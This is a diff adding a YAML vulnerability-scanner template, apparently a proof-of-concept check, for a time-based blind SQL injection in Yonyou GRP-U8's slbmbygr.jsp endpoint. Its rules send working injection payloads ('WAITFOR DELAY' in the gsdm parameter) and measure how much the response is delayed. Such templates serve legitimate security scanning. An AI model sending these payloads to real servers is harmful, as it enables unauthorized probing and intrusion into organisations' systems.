@@ -1,0 +1,35 @@
+id: yonyou-grp-u8-slbmbygr-sqi
+
+info:
+  name: youyou grp u8 slbmbygr.jsp sqi
+  author: ct
+  severity: high
+  verified: true
+  description: |
+    在用友GRP-U8的slbmbygr.jsp 存在SQL注入漏洞，由于用友GRP-U8未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。
+
+rules:
+  r0: 
+    request: 
+      method: GET    
+      path: /u8qx/slbmbygr.jsp?gsdm=1';WAITFOR DELAY '0:0:0'--
+    expression: |
+      response.status == 200
+    output: # 捕获网站原始响应延时
+      t0: response.latency
+  r1:
+    request: 
+      method: GET    
+      path: /u8qx/slbmbygr.jsp?gsdm=1';WAITFOR DELAY '0:0:5'--
+      body: mlid=';WAITFOR DELAY '0:0:5'--
+    expression: | # 时间盲注5秒后网站的响应延时 - 网站原始响应延时 > 4500ms
+      response.status == 200 &&
+      response.latency - t0 >= 5 * 1000 - 500 
+  r2:
+    request: 
+      method: GET    
+      path: /u8qx/slbmbygr.jsp?gsdm=1';WAITFOR DELAY '0:0:3'--
+    expression: | # 时间盲注3秒后网站的响应延时 - 网站原始响应延时 > 2500ms
+      response.status == 200 &&
+      response.latency - t0 >= 3 * 1000 - 500
+expression: r0() && r1() && r2()
